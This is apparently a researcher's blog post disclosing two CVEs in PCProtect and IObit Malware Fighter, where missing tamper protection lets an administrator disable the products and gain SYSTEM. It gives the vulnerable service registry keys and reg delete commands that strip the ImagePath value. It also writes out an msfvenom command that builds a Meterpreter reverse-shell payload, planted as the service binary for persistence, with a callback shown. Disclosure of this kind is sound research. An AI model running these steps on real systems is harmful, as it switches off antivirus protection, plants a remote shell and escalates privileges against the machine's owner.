=== Content from mrvar0x.com_3c1d7184_20250114_184610.html ===

[Skip to content](#main)

[Mrvar0x - YME](https://mrvar0x.com)

Null Exploitation

open primary menu

* [twitter](https://twitter.com/mrvar0x)
* [linkedin](https://www.linkedin.com/in/yehiamamdouh/)
* [github](https://github.com/yehia-mamdouh)

* [Whoami](https://mrvar0x.com/whoami-mrvar0x/)
* [Other Writeups – Articles](https://mrvar0x.com/other-writeups-articles/)

# Sidebar

SearchSearch
## Recent Posts

* [“Ghost Shells: Deploying Meterpreter Without Detection”](https://mrvar0x.com/2025/01/13/ghost-shells-deploying-meterpreter-without-detection/)
* [Shell3er Reverse Shell & EDR Evasion](https://mrvar0x.com/2023/05/07/powershell-reverse-shell-edr-evasion/)
* [A Python Shell with XOR Algorithm – Bypass Windows Defender & AV’s](https://mrvar0x.com/2023/01/09/a-python-shell-with-xor-algorithm-bypass-windows-defender-amp-avs/)
* [Checkpoint Anti Phishing Evasion](https://mrvar0x.com/2022/08/15/checkpoint-anti-phishing-evasion/)
* [Multiple Endpoints Security Tampering Exploit](https://mrvar0x.com/2022/08/02/multiple-endpoints-security-tampering-exploit/)

![](https://mrvar0x.com/wp-content/uploads/2022/07/Blog_CybersecurityStatistics_BlogHero_202206_V2.png)
# Multiple Endpoints Security Tampering Exploit

Published on [August 2, 2022](https://mrvar0x.com/2022/08/)

(PCProtect Antivirus prior to version 5.17.470) **and** (IObit Malware Fighter 9.2) installed on Microsoft Windows does not provide sufficient anti-tampering protection of services by users with Administrator privileges. This could result in a user disabling PCProtect Antivirus and IObit Malware Fighter and the protection offered by them. Also, It leads to raising privilege to SYSTEM.

**Introduction**

Tampering and/or disabling security software is a technique employed by attackers in today’s threat landscape. Tampering allows attackers –> (local administrators, users, and malware) to modify or disable Endpoint Protection processes, resources, and services, also allow attackers to apply modifications to Endpoint Protection registry settings, and files, and tamper with running processes on Windows clients. Also with allows an attacker to raised privileges to SYSTEM, which will be useful also in lunching malware.

`Note: [PCProtect](https://www.pcprotect.com/) Version 5.17.470 and [IObit Malware Fighter](https://www.iobit.com/en/malware-fighter.php) 9.2 was installed on Windows 10 Pro`

**Disabling Endpoints Security Service** **Via Registry**

A malicious attacker with local administrator privilege can disable PCProtect Antivirus and IObit Malware Fighter through the registry due to missing tamper protection.

`#Vulnerable Registry Key for PCProtect
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityService`

`#Vulnerable Registry Key for IObit Malware Fighter HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AdvancedSystemCareService15
\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IMFservice`

**Three values will be modified:**

1- (**ImagePath**) the value can be replaced with malicious service executable.
2- (**Start**) Change the value to 0x02 Hex. Which means Specifies a driver or service that is initialized at system startup by Session Manager (It already = 2)
3- (**Type**) Change to (10) Hex. Which mean A Win32 program that runs in a process by itself. This type of Win32 service.can be started by the Service Controller.32 service should be run as a stand-alone process. (It’s already = 10)

![](https://mrvar0x.com/wp-content/uploads/2022/07/22-2-1024x661.png)

In our case we only change the (ImagePath) to (ngrox.exe) to become

“C:\Program Files (x86)\PCProtect\ngrok.exe”

“C:\Program Files (x86)\IObit\Advanced SystemCare\ngrok.exe”

“C:\Program Files (x86)\IObit\IObit Malware Fighter\ngrok.exe”

As we see we restart the Operating system and service was disabled

![](https://mrvar0x.com/wp-content/uploads/2022/08/55-1-1024x351.png)

Another way to apply that is to delete the registry key from the CMD command line, we have used the`reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SecurityService`to retrieve values of any key.

![](https://mrvar0x.com/wp-content/uploads/2022/07/44-1-1024x522.png)

Then we used `reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SecurityService /v ImagePath /f` to delete (ImagePath)

![](https://mrvar0x.com/wp-content/uploads/2022/07/55-2-1024x586.png)

The service has been deleted and we have stopped/deleted the Protection.

**Exploiting to Establish Persistence**

Establishing persistence by allowing for raising privilege is by way of modifying the parameters of services that start each time Windows is launched. So if the permissions aren’t configured correctly and allow the registry keys for a service to be modified such as (ImagePath or binPath key) to point to a malicious executable, that allows the malware to launch at Windows startup, and that malicious executable can be run under a local system account with elevated privileges.

We have created a malicious payload by msfvenom (`msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LOCALIP LPORT=4444 -f exe -o meta.exe`)

![](https://mrvar0x.com/wp-content/uploads/2022/07/66-1-1024x871.png)

I have put the malicious executable on the same PCProtect and IObit Malware Fighter installation folder and modified the registry key value (ImagePath) with my malicious executable.

![](https://mrvar0x.com/wp-content/uploads/2022/07/77-1-1024x524.png)

As we see, I have got a callback to my attacking machine lunched by both endpoints protection, my (metadata) and the (PCProtect.exe) (IMF.exe)

![](https://mrvar0x.com/wp-content/uploads/2022/08/44-1-1024x486.png)![](https://mrvar0x.com/wp-content/uploads/2022/07/88-1-1024x292.png)

Boom the privilege raised from local administrator to SYSTEM.

**Conclusion**

Attackers always like to disable any existing security features, such as antivirus protection, to get easier and maintain access to data or install malware or even exploit devices. Implementing tamper protection will help to prevent such attacks from occurring. I got 2 CVE’s (CVE-2022-36670) & (CVE-2022-37771) I hope enjoy the reading **Mrvar0x**

**References**

[Packetstormsecurity PCProtect](https://packetstormsecurity.com/files/167800/PCProtect-Endpoint-5.17.470-Tampering-Privilege-Escalation.html)

[P](https://packetstormsecurity.com/files/167913/IObit-Malware-Fighter-9.2-Tampering-Privilege-Escalation.html)[acketstormsecurity IObit Malware Fighter](https://packetstormsecurity.com/files/167913/IObit-Malware-Fighter-9.2-Tampering-Privilege-Escalation.html)

Published in[Uncategorized](https://mrvar0x.com/category/uncategorized/ "View all posts in Uncategorized")

* [0day](https://mrvar0x.com/tag/0day/ "View all posts tagged 0day")
* [Anti-Virus](https://mrvar0x.com/tag/anti-virus/ "View all posts tagged Anti-Virus")
* [Endpoint](https://mrvar0x.com/tag/endpoint/ "View all posts tagged Endpoint")
* [evasion](https://mrvar0x.com/tag/evasion/ "View all posts tagged evasion")
* [exploit](https://mrvar0x.com/tag/exploit/ "View all posts tagged exploit")
* [hacking](https://mrvar0x.com/tag/hacking/ "View all posts tagged hacking")
* [vulnerability](https://mrvar0x.com/tag/vulnerability/ "View all posts tagged vulnerability")

Previous Post
[TFTP Exploitation (BO)](https://mrvar0x.com/2022/05/06/tftp-exploitation/)
Next Post
[Checkpoint Anti Phishing Evasion](https://mrvar0x.com/2022/08/15/checkpoint-anti-phishing-evasion/)

Hacking is to Know the Unknown - & Break Boundaries Guided by Curiosity


